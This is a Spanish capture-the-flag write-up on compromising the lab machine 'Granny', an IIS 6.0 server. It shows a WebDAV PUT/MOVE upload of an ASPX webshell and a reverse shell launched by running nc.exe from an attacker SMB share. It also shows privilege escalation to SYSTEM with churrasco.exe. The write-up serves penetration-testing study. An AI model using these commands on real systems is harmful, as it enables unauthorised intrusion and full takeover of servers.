----
- Tags: #IIS #PUT #MOVE #HTTP-METHOD #webshell #ASPX #smbserver #juicypotato #churrasco
------
# Resolución

## Reconocimiento

### NMAP

**Puertos**
```js
# Nmap 7.94SVN scan initiated Tue Nov 26 18:50:34 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.25s latency).
Scanned at 2024-11-26 18:50:34 -03 for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Nov 26 18:51:01 2024 -- 1 IP address (1 host up) scanned in 26.73 seconds
```

**Servicios**
```js
# Nmap 7.94SVN scan initiated Tue Nov 26 18:51:23 2024 as: nmap -sCV -p80 -oN services 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Tue, 26 Nov 2024 21:51:23 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 26 18:51:37 2024 -- 1 IP address (1 host up) scanned in 13.89 seconds
```

## Explotación

### HTTP-METHODS

Descubrimos que en la web **están habilitados diferentes tipos de métodos HTTP**, entre ellos ``TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT``, por lo tanto podríamos intentar jugar con estos manualmente o utilizar la herramienta ``davtest --url <url>`` para que esta realice el chequeo de cuales son los archivos que pueden subirse.

- ``davtest -url http://10.10.10.15``

![[Granny 1.png]]

En este caso automáticamente está utilizando el método **``PUT``** que está permitido por lo que vimos.
Las extensiones que más críticas son si pudiésemos subir archivos serían ``ASP``, ``ASPX`` y ``PHP`` en este caso.

**ASPX** y **ASP** son las que ==servirían== en este caso ya que al tratarse de un **Microsoft IIS** (*Internet Information Services*) como lo vimos en el escaneo de **NMAP** nos interpretaría dichas extensiones.

En este caso la alternativa que encontré fue **subir un archivo** con extensión ``.txt`` (que está permitido) con una **webshell** programada en **``aspx``** dentro, esta se encuentra en el directorio por defecto **``/usr/share/webshells/aspx/cmdasp.aspx``**. Luego con el método **``MOVE``** modificar el nombre del archivo a **``.aspx``**, de esta forma sería interpretada.

- *``curl -s -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.txt ``* --> Subimos el archivo ``cmdasp.txt`` con el contenido de la **Webshell** dentro.

- *``curl -s -X MOVE -H "Destination: http://10.10.10.15/cmdasp.aspx" http://10.10.10.15/cmdasp.txt``* --> Modificamos el nombre del ``.txt`` a ``.aspx``.

Verificamos que el archivo **``cmdasp.aspx``** se interpretó correctamente.

![[Granny 2.png]]

Tenemos **RCE**, por lo tanto podríamos entablarnos una **Reverse Shell** para Windows.

En este caso lo más útil sería aprovechar el repositorio **SecLists** ya que dentro de uno de sus directorios se encuentra un archivo **``nc.exe``** este lo que hace al ser **ejecutado** en una máquina Windows es realizar una Reverse Shell. La ruta por defecto de dicho binario es ``/usr/share/SecLists/Web-Shells/FuzzDB/nc.exe``.

----

Simplemente traeríamos dicho binario al directorio actual de trabajo en nuestra máquina de atacante y luego tendríamos que **compartir** este binario montando un servidor local con **SMB** de la siguiente manera

- ``impacket-smbserver smbFolder $(pwd) -smb2support`` ---> **``smbFolder``** es el nombre del recurso compartido que estamos brindando (Puede ser cualquier otro nombre).

Ahora también en nuestra máquina de atacante nos pondríamos en escucha por el *puerto 443*.

- ``rlwrap nc -nlvp 443``

Por ultimo en la Webshell que conseguimos inyectar colocaríamos la siguiente cadena.

- ``\\10.10.14.25\smbFolder\nc.exe -e cmd 10.10.14.25 443``

De esta forma estaríamos accediendo al recurso compartido por nuestro servidor SMB y luego **ejecutaríamos el archivo** ``nc.exe`` especificándole hacia donde quiero que se entable la conexión.

![[Granny 3.png]]

![[Granny 4.png]]

![[Granny 5.png]]

De esta forma ganaríamos acceso a la máquina **Granny**.

## Escalada de Privilegios

Una vez tenemos acceso a la máquina procedemos a la escalada de privilegios hacia el usuario **``nt-authority\system``**.

- Si hacemos un **``systeminfo``** veremos toda la información del Sistema operativo.
- Si hacemos un **``whoami /priv``** veremos los privilegios actuales del sistema.

![[Granny 7.png]]

------

![[Granny 6.png]]

-----

En este caso cuando el privilegio **``SeImpersonPrivilage``** está **``Enabled``** podríamos utilizar la utilidad llamada **``Juicy Potatoe``** de su [repositorio](https://github.com/k4sth4/Juicy-Potato) pero esta no funcionaría ya que no se encuentra disponible para la versión de Windows que posee la máquina Granny, esto se debe a que es muy antigua como vimos al utilizar ``systeminfo``. (*Windows Server 2003*)

Para estos casos hay una utilidad alternativa llamada **``churrasco``**, esta utilidad funciona para equipos más antiguos de Windows como el de nuestro caso, esta se puede encontrar en el siguiente [link](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/).
Una vez descarguemos ``churrasco.exe`` simplemente pasamos la utilidad a la máquina víctima con un **``smbserver``** por ejemplo.

- ``impacket-smbserver smbfolder $(pwd) -smb2support`` --> El archivo **``churrasco.exe``** debe estar en el directorio actual de nuestra máquina atacante.
- ``copy \\10.10.14.25\smbfolder\churrasco.exe churrasco.exe`` --> Lo ideal sería estar en el directorio ``C:\WINDOWS\Temp``, en mi caso cree con ``mkdir privesc`` una carpeta dentro de **Temp**.

----

Por último simplemente tendremos que pasar el ejecutable **``churrasco.exe``** a la máquina víctima, en mi caso otra vez usaré un **``smbserver``**.
Si ejecutamos ``churrasco.exe`` nos darán las instrucciones para su ejecución, nosotros por ejemplo podríamos hacer lo siguiente.

- ``churrasco.exe -d "whoami"``

Este comando se ejecutará como usuario **``Authority``**.

Si quisieramos ganar acceso total a dicho usuario privilegiado con una consola podríamos utilizar el **``nc.exe``** que usamos previamente para ganar acceso a la máquina, pero esta vez a través del **``churrasco.exe``**.

Por lo tanto compartimos el recurso con **``smbserver``** y realizaríamos la escalada.

- ``impacket-smbserver smbfolder $(pwd) -smb2support`` --> *Terminal 1* ofreciendo el ``nc.exe``.
- ``rlwrap nc -nvlp 443`` --> *Terminal 2*.
- ``churrasco.exe -d "\\10.10.14.25\smbfolder\nc.exe -e cmd 10.10.14.25 443"`` --> *Terminal 3* ejecutando el ``nc.exe`` de la Terminal 1 y entablando la **Reverse Shell**.

![[Granny 8.png]]

De esta forma **ganaríamos acceso** como usuario **``Nt Authority\system``**.